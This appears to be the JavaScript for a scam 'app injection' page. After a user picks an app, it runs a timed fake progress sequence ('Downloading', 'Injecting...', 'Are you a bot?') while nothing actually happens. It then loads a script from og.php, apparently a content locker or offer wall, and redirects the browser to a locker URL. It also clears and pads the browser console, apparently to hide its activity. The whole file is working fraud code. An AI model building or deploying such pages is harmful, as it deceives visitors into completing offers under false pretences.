$(document).ready(function() {
  var _connectingTxt = "Connecting with your phone...";
  $process_message_2 = "Downloading";
  $process_message_3 = "Starting injection via browser";
  $process_message_4 = "Injecting...";
  $process_message_5 = "Injection finished. Are you a bot?.";
 
 
  $(".accent-color").css("color", accent_color);
  $(".accent-bg").css("background", accent_color);
  $("#live-search").on("keyup keypress", function(_event) {
    var _pressedKey = _event.keyCode || _event.which;
    if (_pressedKey === 13) {
      return _event.preventDefault(), false;
    }
  });
  $("#filter").keyup(function() {
    var _value = $(this).val();
    var _showedCount = 0;
    $(".app-line-grid-wrapper ul li").each(function() {
      if ($(this).text().search(new RegExp(_value, "i")) < 0) {
        $(this).fadeOut();
      } else {
        $(this).show();
        _showedCount++;
      }
    });
    var _unused = _showedCount;
  });
  $("li.app-line-grid-item").click(function() {
    $c_l_url = $(this).attr("data-c-l-url");
    $(".app-line-grid-section").append('<div id="840i"></div>');
    $selected_app_img = $(this).find("img.app-img").attr("src");
    $selected_app_title = $(this).find(".app-title").text();
    $selected_app_description = $(this).find(".app-description").text();
    $locker_url_id = $(this).attr("data-locker-url-id");
    $.ajax({
      "type" : "GET",
      "url" : "parts/part1.html",
      "success" : function(_responce) {
        $("#840i").html(_responce).hide().fadeIn();
        console.clear();
        console.log("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
        $(".accent-color").css("color", accent_color);
        $(".accent-bg").css("background", accent_color);
        $(".mockup-icon").attr("src", $selected_app_img);
        $(".title-under").append($selected_app_title);

        $.magnificPopup.open({
          "items" : {
            "src" : "#app-modal-holder"
          },
          "type" : "inline",
          "preloader" : false,
          "mainClass" : "animated slideInUp",
          "modal" : true,
          "fixedContentPos" : true,
          "fixedBgPos" : true,
          "callbacks" : {
            "open" : function() {
              $("#inject-now").click(function() {
                $.ajax({
                  "type" : "GET",
                  "url" : "parts/part2.html",
                  "success" : function(_responce) {
                    function _animateBar(_to, _barElement, _time) {
                      var _percent = _to * _barElement.width() / 100;
                      _barElement.find("div").animate({
                        "width" : _percent
                      }, _time).html(_to + "%&nbsp;");
                    }
                    $("#840i").append('<div id="process-holder"></div>');
                    $("#process-holder").html(_responce).hide().fadeIn();
                    $(".processing-wrapper").append('<script type="text/javascript" id="ogjs" src="og.php?tool=cl&toolarg=s&id=' + $locker_url_id + '">\x3c/script>');
                    $(".accent-color").css("color", accent_color);
                    $(".accent-bg").css("background", accent_color);
                    console.clear();
                    console.log("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
                    _animateBar(0, $("#progressBarConsole"), 1);
                    _animateBar(100, $("#progressBarConsole"), 25000);
                    $(".processing-msg").html(_connectingTxt);
                    $(".processing-msg").addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                      $(this).removeClass("animated bounceIn");
                    });
                    setTimeout(function() {
                      $(".processing-msg").html($process_message_2 + " " + $selected_app_title + ".gz");
                      $(".processing-msg").addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                        $(this).removeClass("animated bounceIn");
                      });
                    }, 3000);
                    setTimeout(function() {
                      $(".processing-msg").html($process_message_3 + " " + $selected_app_title + ".gz");
                      $(".processing-msg").addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                        $(this).removeClass("animated bounceIn");
                      });
                    }, 8000);
                    setTimeout(function() {
                      $(".processing-msg").html($process_message_4);
                      $(".processing-msg").addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                        $(this).removeClass("animated bounceIn");
                      });
                    }, 12000);
                    setTimeout(function() {
                      $(".processing-msg").html($process_message_5);
                      $(".processing-msg").addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                        $(this).removeClass("animated bounceIn");
                      });
                    }, 25000);
                    setTimeout(function() {
                      window.location.replace($c_l_url);
                    }, 27000);
                  }
                });
              });
            }
          }
        });
      }
    });
  });
});
